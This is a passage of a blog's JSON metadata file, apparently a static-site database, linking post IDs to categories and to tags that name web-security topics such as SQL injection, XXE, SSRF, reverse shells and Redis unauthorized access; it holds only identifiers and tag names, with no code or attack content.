"post_id":"ckt46mpgi0054vkq30rne3kk2","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpgk005avkq3hef3219u"},{"post_id":"ckt46mpgj0056vkq3eidw6bp3","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpgl005dvkq3457m559o"},{"post_id":"ckt46mpgj0057vkq38qztbe5m","category_id":"ckt46mpfe000svkq395k314eg","_id":"ckt46mpgm005fvkq32wknfywx"},{"post_id":"ckt46mpgk0059vkq3ghbw9asz","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpgo005hvkq3gboi05ne"},{"post_id":"ckt46mpgl005cvkq31a1ub2ef","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpgp005kvkq34976al94"},{"post_id":"ckt46mpgm005evkq3byat6sm1","category_id":"ckt46mpgo005jvkq3f39jereu","_id":"ckt46mpgq005qvkq31zju6gr5"},{"post_id":"ckv3u4ogm0000ovq37wh19riy","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckv6abjqc00018kq3a7fg7ol0"}],"PostTag":[{"post_id":"ckt46mpet0001vkq39a8mef0p","tag_id":"ckt46mpf00005vkq3epr64c5h","_id":"ckt46mpfi000wvkq3h6nv9ti5"},{"post_id":"ckt46mpet0001vkq39a8mef0p","tag_id":"ckt46mpf4000dvkq3286l22p0","_id":"ckt46mpfj000zvkq393iqc0rq"},{"post_id":"ckt46mpet0001vkq39a8mef0p","tag_id":"ckt46mpf8000jvkq36q76ci5n","_id":"ckt46mpfk0014vkq36jzx8th9"},{"post_id":"ckt46mpet0001vkq39a8mef0p","tag_id":"ckt46mpfa000ovkq36vy6auxm","_id":"ckt46mpfl0017vkq3028q2iui"},{"post_id":"ckt46mpex0003vkq3hpt0f48f","tag_id":"ckt46mpfe000tvkq3bg4p219n","_id":"ckt46mpfn001dvkq3f32w6z5q"},{"post_id":"ckt46mpex0003vkq3hpt0f48f","tag_id":"ckt46mpfk0013vkq312jmdyah","_id":"ckt46mpfo001gvkq316u79vl8"},{"post_id":"ckt46mpf10007vkq35lny0nss","tag_id":"ckt46mpfm001avkq35f7ochex","_id":"ckt46mpfr001rvkq30nei7r9k"},{"post_id":"ckt46mpf10007vkq35lny0nss","tag_id":"ckt46mpfo001hvkq36jc4e99y","_id":"ckt46mpfs001tvkq34yvx8afn"},{"post_id":"ckt46mpf10007vkq35lny0nss","tag_id":"ckt46mpfq001mvkq3cf2bewov","_id":"ckt46mpfs001wvkq3er3ucuke"},{"post_id":"ckt46mpf20009vkq315t260uz","tag_id":"ckt46mpfm001avkq35f7ochex","_id":"ckt46mpft0020vkq37fmeh4lg"},{"post_id":"ckt46mpf20009vkq315t260uz","tag_id":"ckt46mpfo001hvkq36jc4e99y","_id":"ckt46mpft0021vkq3g0zz3y9n"},{"post_id":"ckt46mpf20009vkq315t260uz","tag_id":"ckt46mpfq001mvkq3cf2bewov","_id":"ckt46mpfu0023vkq3fd029fqu"},{"post_id":"ckt46mpf3000bvkq3dw0q6zot","tag_id":"ckt46mpfm001avkq35f7ochex","_id":"ckt46mpfu0026vkq3f8yp9npq"},{"post_id":"ckt46mpf3000bvkq3dw0q6zot","tag_id":"ckt46mpfo001hvkq36jc4e99y","_id":"ckt46mpfv0027vkq3ctub2q99"},{"post_id":"ckt46mpf3000bvkq3dw0q6zot","tag_id":"ckt46mpfq001mvkq3cf2bewov","_id":"ckt46mpfv0029vkq3c2zlci3y"},{"post_id":"ckt46mpf6000fvkq3ejlw3yya","tag_id":"ckt46mpfu0025vkq3df5ah93c","_id":"ckt46mpfv002bvkq34sn5dfyu"},{"post_id":"ckt46mpf6000fvkq3ejlw3yya","tag_id":"ckt46mpf4000dvkq3286l22p0","_id":"ckt46mpfv002cvkq3edkl9no0"},{"post_id":"ckt46mpf6000fvkq3ejlw3yya","tag_id":"ckt46mpfv0028vkq3fknfeu3o","_id":"ckt46mpfw002evkq3bbd519su"},{"post_id":"ckt46mpf8000kvkq31fqzf0cu","tag_id":"ckt46mpfq001mvkq3cf2bewov","_id":"ckt46mpfw002hvkq37l8c809w"},{"post_id":"ckt46mpf8000kvkq31fqzf0cu","tag_id":"ckt46mpfw002dvkq398svdft3","_id":"ckt46mpfw002ivkq3ardk1pjj"},{"post_id":"ckt46mpf8000kvkq31fqzf0cu","tag_id":"ckt46mpfw002fvkq37chg7iam","_id":"ckt46mpfx002kvkq31sovgbtl"},{"post_id":"ckt46mpf9000lvkq383uu0obl","tag_id":"ckt46mpfw002gvkq363dg0c6l","_id":"ckt46mpfy002ovkq30zgw59rk"},{"post_id":"ckt46mpf9000lvkq383uu0obl","tag_id":"ckt46mpfx002jvkq39u5z9ifk","_id":"ckt46mpfy002pvkq3h1s75i4a"},{"post_id":"ckt46mpf9000lvkq383uu0obl","tag_id":"ckt46mpfx002lvkq399x9g8xz","_id":"ckt46mpfy002rvkq3g2rb7k8z"},{"post_id":"ckt46mpf9000lvkq383uu0obl","tag_id":"ckt46mpfx002mvkq37cdg4k47","_id":"ckt46mpfy002svkq3casg4uzs"},{"post_id":"ckt46mpf9000lvkq383uu0obl","tag_id":"ckt46mpf8000jvkq36q76ci5n","_id":"ckt46mpfy002uvkq3dwz6ba1t"},{"post_id":"ckt46mpfc000pvkq3aypb1ps8","tag_id":"ckt46mpfq001mvkq3cf2bewov","_id":"ckt46mpfz002wvkq3acl0f9c6"},{"post_id":"ckt46mpfc000pvkq3aypb1ps8","tag_id":"ckt46mpfy002qvkq31lli7c7j","_id":"ckt46mpfz002xvkq3cc2h80ab"},{"post_id":"ckt46mpfc000pvkq3aypb1ps8","tag_id":"ckt46mpfy002tvkq3gktba1ub","_id":"ckt46mpfz002zvkq36ffb195k"},{"post_id":"ckt46mpfd000qvkq31kpm1r6y","tag_id":"ckt46mpfz002vvkq31cjq5t05","_id":"ckt46mpg00033vkq3c1p22rcc"},{"post_id":"ckt46mpfd000qvkq31kpm1r6y","tag_id":"ckt46mpfz002yvkq3ee3jhfrq","_id":"ckt46mpg00034vkq3f5s69jjd"},{"post_id":"ckt46mpfd000qvkq31kpm1r6y","tag_id":"ckt46mpfz0030vkq3d166bo2p","_id":"ckt46mpg00036vkq398jk8gid"},{"post_id":"ckt46mpfd000qvkq31kpm1r6y","tag_id":"ckt46mpfx002mvkq37cdg4k47","_id":"ckt46mpg00037vkq3arbj0rzv"},{"post_id":"ckt46mpfe000uvkq3bkki71mg","tag_id":"ckt46mpg00032vkq3086rgh8k","_id":"ckt46mpg1003bvkq38t9c6tto"},{"post_id":"ckt46mpfe000uvkq3bkki71mg","tag_id":"ckt46mpg00035vkq377hjdl3k","_id":"ckt46mpg1003cvkq35rhdhs4x"},{"post_id":"ckt46mpfe000uvkq3bkki71mg","tag_id":"ckt46mpg10038vkq34lpq1jbj","_id":"ckt46mpg2003evkq38hj3dwix"},{"post_id":"ckt46mpfe000uvkq3bkki71mg","tag_id":"ckt46mpg10039vkq31dogf4kw","_id":"ckt46mpg2003fvkq3augwevid"},{"post_id":"ckt46mpfi000xvkq3dwewdxul","tag_id":"ckt46mpfy002qvkq31lli7c7j","_id":"ckt46mpg3003kvkq3dx6cgt55"},{"post_id":"ckt46mpfi000xvkq3dwewdxul","tag_id":"ckt46mpfy002tvkq3gktba1ub","_id":"ckt46mpg3003lvkq3evacg23m"},{"post_id":"ckt46mpfi000xvkq3dwewdxul","tag_id":"ckt46mpfx002lvkq399x9g8xz","_id":"ckt46mpg3003nvkq3dk7ndg83"},{"post_id":"ckt46mpfi000xvkq3dwewdxul","tag_id":"ckt46mpg2003hvkq3holn2euc","_id":"ckt46mpg3003ovkq33v3jhs7x"},{"post_id":"ckt46mpfi000xvkq3dwewdxul","tag_id":"ckt46mpg2003ivkq394n1bcch","_id":"ckt46mpg4003qvkq3h7t5bvk4"},{"post_id":"ckt46mpfj0011vkq3dhae2xlx","tag_id":"ckt46mpfq001mvkq3cf2bewov","_id":"ckt46mpg4003rvkq3eem87yp0"},{"post_id":"ckt46mpfj0011vkq3dhae2xlx","tag_id":"ckt46mpfe000tvkq3bg4p219n","_id":"ckt46mpg4003tvkq30cxdde4s"},{"post_id":"ckt46mpfj0011vkq3dhae2xlx","tag_id":"ckt46mpg3003mvkq37qj42w5o","_id":"ckt46mpg4003uvkq3caen6q1f"},{"post_id":"ckt46mpfk0015vkq31iiqgz5o","tag_id":"ckt46mpfq001mvkq3cf2bewov","_id":"ckt46mpg5003yvkq38we7c9d1"},{"post_id":"ckt46mpfk0015vkq31iiqgz5o","tag_id":"ckt46mpg4003svkq36sjrbadh","_id":"ckt46mpg5003zvkq3h75019af"},{"post_id":"ckt46mpfk0015vkq31iiqgz5o","tag_id":"ckt46mpg4003vvkq31v3m6b6s","_id":"ckt46mpg50041vkq3ag43evyi"},{"post_id":"ckt46mpfk0015vkq31iiqgz5o","tag_id":"ckt46mpg4003wvkq3bqke989t","_id":"ckt46mpg50042vkq378oefn9l"},{"post_id":"ckt46mpfl0018vkq30fwz5qq6","tag_id":"ckt46mpfy002qvkq31lli7c7j","_id":"ckt46mpg80046vkq30cg2asdd"},{"post_id":"ckt46mpfl0018vkq30fwz5qq6","tag_id":"ckt46mpg50040vkq3emhp124g","_id":"ckt46mpg80047vkq33dwy7b6y"},{"post_id":"ckt46mpfl0018vkq30fwz5qq6","tag_id":"ckt46mpg50043vkq3fb5e86rd","_id":"ckt46mpg80049vkq3dek76og5"},{"post_id":"ckt46mpfl0018vkq30fwz5qq6","tag_id":"ckt46mpg60044vkq3hfnlds0u","_id":"ckt46mpg9004avkq3cp2t86o8"},{"post_id":"ckt46mpfm001bvkq3fp0672jj","tag_id":"ckt46mpf8000jvkq36q76ci5n","_id":"ckt46mpga004evkq38q9y1l29"},{"post_id":"ckt46mpfm001bvkq3fp0672jj","tag_id":"ckt46mpg60045vkq30n1h0veb","_id":"ckt46mpga004fvkq33wvehjpy"},{"post_id":"ckt46mpfm001bvkq3fp0672jj","tag_id":"ckt46mpg80048vkq37mj5ghxf","_id":"ckt46mpga004hvkq32gwv4pgt"},{"post_id":"ckt46mpfm001bvkq3fp0672jj","tag_id":"ckt46mpg9004bvkq3cob25h2t","_id":"ckt46mpga004ivkq300fdhk6m"},{"post_id":"ckt46mpfm001bvkq3fp0672jj","tag_id":"ckt46mpg9004cvkq303cidq2q","_id":"ckt46mpgb004kvkq36lotc79h"},{"post_id":"ckt46mpfn001evkq3h2i9a3sa","tag_id":"ckt46mpf8000jvkq36q76ci5n","_id":"ckt46mpgb004nvkq34vav2t77"},{"post_id":"ckt46mpfn001evkq3h2i9a3sa","tag_id":"ckt46mpg9004dvkq38q3n5o5t","_id":"ckt46mpgb004ovkq35zcr4y0m"},{"post_id":"ckt46mpfn001evkq3h2i9a3sa","tag_id":"ckt46mpga004gvkq3f67yc7aw","_id":"ckt46mpgc004qvkq3hpu33iz0"},{"post_id":"ckt46mpfn001evkq3h2i9a3sa","tag_id":"ckt46mpga004jvkq3d1pqa79k","_id":"ckt46mpgc004rvkq3boe5791x"},{"post_id":"ckt46mpfn001evkq3h2i9a3sa","tag_id":"ckt46mpgb004lvkq37h979g3i","_id":"ckt46mpgc004tvkq39p6f8ci2"},{"post_id":"ckt46mpfo001ivkq35o2gb3ou","tag_id":"ckt46mpgb004mvkq37ko30crc","_id":"ckt46mpgd004vvkq3fr6d0lkh"},{"post_id":"ckt46mpfo001ivkq35o2gb3ou","tag_id":"ckt46mpgb004pvkq392vrblsc","_id":"ckt46mpgd004wvkq3fknq2z9j"},{"post_id":"ckt46mpfo001ivkq35o2gb3ou","tag_id":"ckt46mpgc004svkq36fa093mv","_id":"ckt46mpgd004yvkq329jpewgu"},{"post_id":"ckt46mpfp001kvkq30l5p1owy","tag_id":"ckt46mpfq001mvkq3cf2bewov","_id":"ckt46mpge0050vkq3596m8uod"},{"post_id":"ckt46mpfp001kvkq30l5p1owy","tag_id":"ckt46mpg4003svkq36sjrbadh","_id":"ckt46mpge0051vkq39rag8q67"},{"post_id":"ckt46mpfp001kvkq30l5p1owy","tag_id":"ckt46mpgd004zvkq35md91xi5","_id":"ckt46mpge0052vkq38u5n9efs"},{"post_id":"ckt46mpgh0053vkq33gh6btbw","tag_id":"ckt46mpfq001mvkq3cf2bewov","_id":"ckt46mpgo005ivkq35srzgpf6"},{"post_id":"ckt46mpgh0053vkq33gh6btbw","tag_id":"ckt46mpgi0055vkq33d4j0tii","_id":"ckt46mpgp005lvkq31634e1ai"},{"post_id":"ckt46mpgh0053vkq33gh6btbw","tag_id":"ckt46mpgl005bvkq35yccas5m","_id":"ckt46mpgp005nvkq39bx807xc"},{"post_id":"ckt46mpgi0054vkq30rne3kk2","tag_id":"ckt46mpgo005gvkq3ehgs5cjv","_id":"ckt46mpgq005pvkq36yo87vm7"},{"post_id":"ckt46mpgi0054vkq30rne3kk2","tag_id":"ckt46mpfy002qvkq31lli7c7j","_id":"ckt46mpgq005rvkq3hoe71nbc"},{"post_id":"ckt46mpgi0054vkq30rne3kk2","tag_id":"ckt46mpgp005mvkq3h6q68v83","_id":"ckt46mpgq005tvkq3f0c2bfel"},{"post_id":"ckt46mpgj0056vkq3eidw6bp3","tag_id":"ckt46mpgo005gvkq3ehgs5cjv","_id":"ckt46mpgr005vvkq33h24h6lj"},{"post_id":"ckt46mpgj0056vkq3eidw6bp3","tag_id":"ckt46mpfy002qvkq31lli7c7j","_id":"ckt46mpgr005wvkq315666kme"},{"post_id":"ckt46mpgj0056vkq3eidw6bp3","tag_id":"ckt46mpgq005svkq30jkwcwpj","_id":"ckt46mpgr005yvkq37il269x2"},{"post_id":"ckt46mpgj0057vkq38qztbe5m","tag_id":"ckt46mpgo005gvkq3ehgs5cjv","_id":"ckt46mpgs0060vkq36qxe5yjz"},{"post_id":"ckt46mpgj0057vkq38qztbe5m","tag_id":"ckt46mpfe000tvkq3bg4p219n","_id":"ckt46mpgs0061vkq38af42ijt"},{"post_id":"ckt46mpgj0057vkq38qztbe5m","tag_id":"ckt46mpgr005xvkq3fm8jey26","_id":"ckt46mpgt0063vkq3cxnu591v"},{"post_id":"ckt46mpgj0057vkq38qztbe5m","tag_id":"ckt46mpfu0025vkq3df5ah93c","_id":"ckt46mpgt0064vkq3hrqc7cgb"},{"post_id":"ckt46mpgk0059vkq3ghbw9asz","tag_id":"ckt46mpgs005zvkq3ecdj2iys","_id":"ckt46mpgu0067vkq31kgz9nal"},{"post_id":"ckt46mpgk0059vkq3ghbw9asz","tag_id":"ckt46mpfq001mvkq3cf2bewov","_id":"ckt46mpgu0068vkq3gn71hb7p"},{"post_id":"ckt46mpgk0059vkq3ghbw9asz","tag_id":"ckt46mpgs0062vkq3a9ttfrty","_id":"ckt46mpgu006avkq345t60h8v"},{"post_id":"ckt46mpgk0059vkq3ghbw9asz","tag_id":"ckt46mpgt0065vkq3abu6aqsa","_id":"ckt46mpgu006bvkq322251h7o"},{"post_id":"ckt46mpgl005cvkq31a1ub2ef","tag_id":"ckt46mpgu0066vkq323frc9z8","_id":"ckt46mpgv006dvkq3012380ju"},{"post_id":"ckt46mpgl005cvkq31a1ub2ef","tag_id":"ckt46mpfq001mvkq3cf2bewov","_id":"ckt46mpgv006evkq36fut4w96"},{"post_id":"ckt46mpgm005evkq3byat6sm1","tag_id":"ckt46mpgu0069vkq3fyo21kpm","_id":"ckt46mpgx006hvkq365sn7cd5"},{"post_id":"ckt46mpgm005evkq3byat6sm1","tag_id":"ckt46mpgu006cvkq3buhh9k6w","_id":"ckt46mpgx006ivkq3h128h0w8"},{"post_id":"ckt46mpgm005evkq3byat6sm1","tag_id":"ckt46mpgv006fvkq3a3hnffpy","_id":"ckt46mpgx006jvkq331jccacn"},{"post_id":"ckt46mpgm005evkq3byat6sm1","tag_id":"ckt46mpgw006gvkq3gza95qw4","_id":"ckt46mpgx006kvkq31h8ydsb3"},{"post_id":"ckt46mpgy006lvkq35v7wa36n","tag_id":"ckt46mpg50040vkq3emhp124g","_id":"ckt46mpgz006nvkq30b2qfk1a"},{"post_id":"ckt46mpgy006lvkq35v7wa36n","tag_id":"ckt46mpfy002qvkq31lli7c7j","_id":"ckt46mpgz006ovkq36zalh8zs"},{"post_id":"ckt46mpgy006lvkq35v7wa36n","tag_id":"ckt46mpfy002tvkq3gktba1ub","_id":"ckt46mpgz006pvkq32t63804b"},{"post_id":"ckt46mpgy006lvkq35v7wa36n","tag_id":"ckt46mpfk0013vkq312jmdyah","_id":"ckt46mpgz006qvkq3b26i6j7b"},{"post_id":"ckt46mpgy006lvkq35v7wa36n","tag_id":"ckt46mpgz006mvkq31sqlf0nm","_id":"ckt46mpgz006rvkq34d3x1zkn"},{"post_id":"ckv3u4ogm0000ovq37wh19riy","tag_id":"ckv6abjpj00008kq313on3oe5","_id":"ckv6abjqd00028kq3geju8suk"},{"post_id":"ckv3u4ogm0000ovq37wh19riy","tag_id":"ckt46mpgu0066vkq323frc9z8","_id":"ckv6abjqe00038kq31b5z640h"},{"post_id":"ckv3u4ogm0000ovq37wh19riy","tag_id":"ckt46mpg2003ivkq394n1bcch","_id":"ckv6abjqf00048kq303o952vc"}],"Tag":[{"name":"XXE","_id":"ckt46mpf00005vkq3epr64c5h"},{"name":"weblogic","_id":"ckt46mpf4000dvkq3286l22p0"},{"name":"漏洞复现","_id":"ckt46mpf8000jvkq36q76ci5n"},{"name":"CVE-2019-2888","_id":"ckt46mpfa000ovkq36vy6auxm"},{"name":"sql注入","_id":"ckt46mpfe000tvkq3bg4p219n"},{"name":"盲注","_id":"ckt46mpfk0013vkq312jmdyah"},{"name":"Nginx","_id":"ckt46mpfm001avkq35f7ochex"},{"name":"中间件漏洞","_id":"ckt46mpfo001hvkq36jc4e99y"},{"name":"web安全","_id":"ckt46mpfq001mvkq3cf2bewov"},{"name":"环境搭建","_id":"ckt46mpfu0025vkq3df5ah93c"},{"name":"windows","_id":"ckt46mpfv0028vkq3fknfeu3o"},{"name":"xxe","_id":"ckt46mpfw002dvkq398svdft3"},{"name":"xml外部实体注入","_id":"ckt46mpfw002fvkq37chg7iam"},{"name":"通达OA","_id":"ckt46mpfw002gvkq363dg0c6l"},{"name":"未授权访问","_id":"ckt46mpfx002jvkq39u5z9ifk"},{"name":"漏洞利用","_id":"ckt46mpfx002lvkq399x9g8xz"},{"name":"实战演示","_id":"ckt46mpfx002mvkq37cdg4k47"},{"name":"SQL注入","_id":"ckt46mpfy002qvkq31lli7c7j"},{"name":"显错注入","_id":"ckt46mpfy002tvkq3gktba1ub"},{"name":"ARP欺骗","_id":"ckt46mpfz002vvkq31cjq5t05"},{"name":"女神","_id":"ckt46mpfz002yvkq3ee3jhfrq"},{"name":"mac地址","_id":"ckt46mpfz0030vkq3d166bo2p"},{"name":"dnslog","_id":"ckt46mpg00032vkq3086rgh8k"},{"name":"vps","_id":"ckt46mpg00035vkq377hjdl3k"},{"name":"域名","_id":"ckt46mpg10038vkq34lpq1jbj"},{"name":"dnslog搭建","_id":"ckt46mpg10039vkq31dogf4kw"},{"name":"实战渗透","_id":"ckt46mpg2003hvkq3holn2euc"},{"name":"漏洞挖掘","_id":"ckt46mpg2003ivkq394n1bcch"},{"name":"WAF绕过","_id":"ckt46mpg3003mvkq37qj42w5o"},{"name":"CSRF","_id":"ckt46mpg4003svkq36sjrbadh"},{"name":"SSRF","_id":"ckt46mpg4003vvkq31v3m6b6s"},{"name":"服务器端请求伪造","_id":"ckt46mpg4003wvkq3bqke989t"},{"name":"报错注入","_id":"ckt46mpg50040vkq3emhp124g"},{"name":"updatexml","_id":"ckt46mpg50043vkq3fb5e86rd"},{"name":"靶场演示","_id":"ckt46mpg60044vkq3hfnlds0u"},{"name":"Fastjson","_id":"ckt46mpg60045vkq30n1h0veb"},{"name":"反序列化","_id":"ckt46mpg80048vkq37mj5ghxf"},{"name":"反弹shell","_id":"ckt46mpg9004bvkq3cob25h2t"},{"name":"命令执行","_id":"ckt46mpg9004cvkq303cidq2q"},{"name":"Redis","_id":"ckt46mpg9004dvkq38q3n5o5t"},{"name":"未授权","_id":"ckt46mpga004gvkq3f67yc7aw"},{"name":"写shell","_id":"ckt46mpga004jvkq3d1pqa79k"},{"name":"SSH公钥认证","_id":"ckt46mpgb004lvkq37h979g3i"},{"name":"SMB","_id":"ckt46mpgb004mvkq37ko30crc"},{"name":"系统安全","_id":"ckt46mpgb004pvkq392vrblsc"},{"name":"远程代码执行","_id":"ckt46mpgc004svkq36fa093mv"},{"name":"Cookie","_id":"ckt46mpgd004zvkq35md91xi5"},{"name":"文件包含","_id":"ckt46mpgi0055vkq33d4j0tii"},{"name":"getshell","_id":"ckt46mpgl005bvkq35yccas5m"},{"name":"数据库","_id":"ckt46mpgo005gvkq3ehgs5cjv"},{"name":"Sql Server","_id":"ckt46mpgp005mvkq3h6q68v83"},{"name":"oracle","_id":"ckt46mpgq005svkq30jkwcwpj"},{"name":"oracle数据库","_id":"ckt46mpgr005xvkq3fm8jey26"},{"name":"PHP","_id":"ckt46mpgs005zvkq3ecdj2iys"},{"name":"无回显","_id":"ckt46mpgs0062vkq3a9ttfrty"},{"name":"渗透测试","_id":"ckt46mpgt0065vkq3abu6aqsa"},{"name":"信息收集","_id":"ckt46mpgu0066vkq323frc9z8"},{"name":"cms","_id":"ckt46mpgu0069vkq3fyo21kpm"},{"name":"代码审计","_id":"ckt46mpgu006cvkq3buhh9k6w"},{"name":"bypass","_id":"ckt46mpgv006fvkq3a3hnffpy"},{"name":"php","_id":"ckt46mpgw006gvkq3gza95qw4"},{"name":"宽字节注入","_id":"ckt46mpgz006mvkq31sqlf0nm"},{"name":"SRC","_id":"ckv6abjpj00008kq313on3oe5"}]}}